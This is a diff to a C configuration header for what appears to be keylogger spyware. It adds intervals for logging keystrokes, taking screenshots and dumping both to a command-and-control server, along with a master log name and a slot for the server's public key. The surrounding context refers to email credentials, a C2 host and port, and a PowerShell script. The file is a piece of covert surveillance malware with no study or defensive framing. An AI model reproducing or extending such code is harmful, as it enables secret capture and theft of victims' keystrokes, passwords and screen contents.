@@ -15,9 +15,25 @@
 #define SCRIPT_NAME "sm.ps1"
 
 /**
- * How often the keylog is dumped in minutes
+ * Name of the master log
  **/
-#define FREQUENCY_MINUTES 1
+#define MASTER_LOG_NAME "master_log.log"
+
+/**
+ * How often the keylog is written in minutes
+ **/
+#define LOG_FREQUENCY_MINUTES 1
+
+/**
+ * How often the keylog and screenshots are 
+ * dumped to the server in minutes
+ */
+#define DUMP_FREQUENCY_MINUTES 60
+
+/**
+ * How often screenshots are recorded in minutes
+ */
+#define SS_FREQUENCY_MINUTES 5
 
 /**
  * Login Credentials for email
@@ -31,5 +47,10 @@
  **/
 #define CC_HOSTNAME "localhost"
 #define CC_PORT 3008
+
+/**
+ * Public key of cc server
+ **/
+#define CC_PUBLIC_KEY ""
 
 #endif
